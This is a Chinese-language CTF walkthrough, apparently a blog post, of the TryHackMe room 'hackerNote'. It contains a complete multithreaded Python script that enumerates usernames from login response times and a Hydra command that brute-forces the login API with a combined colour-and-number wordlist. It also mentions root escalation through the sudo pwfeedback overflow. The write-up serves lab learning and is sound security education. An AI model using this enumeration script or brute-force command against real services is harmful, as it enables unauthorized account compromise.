# hackerNote

自定义 Web 应用程序，引入用户名枚举、自定义单词列表和基本权限提升漏洞。

---

## 端口扫描

循例 nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/6a2934c877904143a3597156d970f0ae.png)

## Web

80和8080都是一样的页面，并且存在一个登录页面

![在这里插入图片描述](https://img-blog.csdnimg.cn/7aca9d3bf2f34681bea86c8dec082889.png)

除此之外还有另一个信息就是它只有一个用户

存在注册功能，我们注册一个用户并登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/54c209ddecdb42c2a375574a8087b75f.png)

## Get a Trick

根据thm的引导，我们退出登录

尝试登录无效的账户，而收到登录失败这个响应的时间是差不多2秒

而尝试登录已存在的账户，这个时间则是3秒

我们就可以利用此**微妙的细节**来进行用户枚举

这里通过自己写的多线程py脚本来枚举

**由于openvpn不是特别稳定，容易导致极大的网络延迟，建议在攻击盒上运行脚本**

```python
import requests
from threading import Thread
import time
import sys

thread_num = int(sys.argv[2])
dictPath = sys.argv[1]
thread_list = []
url = "http://10.10.252.137/api/user/login"
valid_list = []


def login(*userList):
    for user in userList:
        data = {"username":user.strip(), "password":"123"}
        start_time = time.time()
        requests.post(url, json=data)
        end_time =time.time()
        ttime = end_time - start_time
        print(ttime)
        if ttime >= 1.0:
            print(f"find: {user}")
            sys.exit()


if __name__ == "__main__":

    user_list = open(dictPath).readlines()

    length = len(user_list)
    step = int(length / thread_num) + 1

    for start in range(0, length, step):
        sub_user_list = user_list[start:start + step]
        t = Thread(target=login, args=(sub_user_list))
        thread_list.append(t)
        t.start()

    for t in thread_list:
        t.join()

    print("done")
```

房间中给了一个缩短的字典，利用这个字典很快就能爆出用户名

![在这里插入图片描述](https://img-blog.csdnimg.cn/56679ea84db743878a09839de4dfe1a4.png)

## 密码爆破

密码提示是“我最喜欢的颜色和我最喜欢的数字”

因此我们可以获得颜色的单词列表和数字的单词列表，并使用Hashcat Util的Combinator将它们组合在一起，这将为我们提供两个单词表的每个组合。使用此词表，我们可以使用 Hydra 攻击登录 API 路由并找到用户的密码。下载附加的单词列表文件，查看它们，然后使用hashcat-util的组合器组合它们。

Hashcat utils可以从以下位置下载： https://github.com/hashcat/hashcat-utils/releases

生成密码字典：

![在这里插入图片描述](https://img-blog.csdnimg.cn/5fb1ee9495df494797b60fc3bb29cc18.png)

有了字典就可以开始爆破，使用hydra:

```bash
hydra -l james -P ./wordlist.txt 10.10.252.137 http-post-form '/api/user/login:username=james&password=^PASS^:F=Invalid'
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/36765b9246a346e9b26e3bb06e265082.png)

登录james，发现直接给出了ssh密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/e01d5826552442f097e00c8bb32194e5.png)

## sudo缓冲区溢出提权

直接登录ssh，拿到user.txt

![在这里插入图片描述](https://img-blog.csdnimg.cn/52aa9f2a1afb4468b89ad77d0c695240.png)

房间引导我们查看sudo -l，当前用户无法以 root 身份运行任何命令。但是，您可能已经注意到，当您输入密码时，您会看到星号。这不是默认行为。最近发布的 CVE 会影响此配置。该设置称为 pwdfeedback

我们稍后也将去另一个[房间](https://tryhackme.com/room/sudovulnsbof)学习这个漏洞

房间为我们提供了exp，我们直接下载过来用

![在这里插入图片描述](https://img-blog.csdnimg.cn/1c96d1e0f9644636a0767bca9a15b689.png)

成功getroot，root.txt还在老地方

---

## 结束

其实这个房间最有意思的点在用户枚举的部分，非常的细节，虽然在thm的burp教程当中有教过类似的时间戳查看方法，但这是第一次将其应用于实践，并且还是自己写脚本，这是非常棒的
